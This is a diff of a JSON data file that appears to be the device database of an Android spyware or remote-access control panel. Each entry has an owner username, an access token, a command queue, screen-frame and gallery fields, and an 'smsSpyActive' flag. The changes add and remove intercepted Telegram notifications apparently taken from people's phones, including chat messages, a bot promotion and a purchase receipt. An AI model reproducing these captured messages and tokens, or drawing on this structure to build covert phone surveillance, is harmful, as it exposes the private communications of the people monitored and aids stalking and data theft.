@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775271245,
+    "lastSeen": 1776775280205,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775272201,
+    "lastSeen": 1776775281215,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ROOM PUBLIK BY JEFF: Rose",
+        "content": "I've kicked Morlana $$$.",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775281344
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5887 pesan baru dari 48 obrolan",
+        "time": "21/04 19:41",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775281328
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14386,22 +14402,6 @@
         "time": "21/04 18:52",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776772361248
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Hàblàr sobrè la muèrte",
-        "content": "🎁 KODE REDEEM BARU!\n\nHalo Pengguna Bot Ada hadiah koin gratis buat 5 orang tercepat.\n\n┣ 🔑 Kode : YANG GERCEP GERCEP AJA\n┣ 💰 Hadiah : 55,555,555 Koin\n┗ 👥 Kuota : 5 Orang\n\n📌 Cara Klaim:\nBuka bot @coinzeetBot lalu ketik:\n/redeem YANG GERCEP GERCEP AJA",
-        "time": "21/04 18:52",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772361184
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Shopee\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******82\n• Waktu: 21/04/2026, 18.52",
-        "time": "21/04 18:52",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772361136
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776775270828,
+    "lastSeen": 1776775279754,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
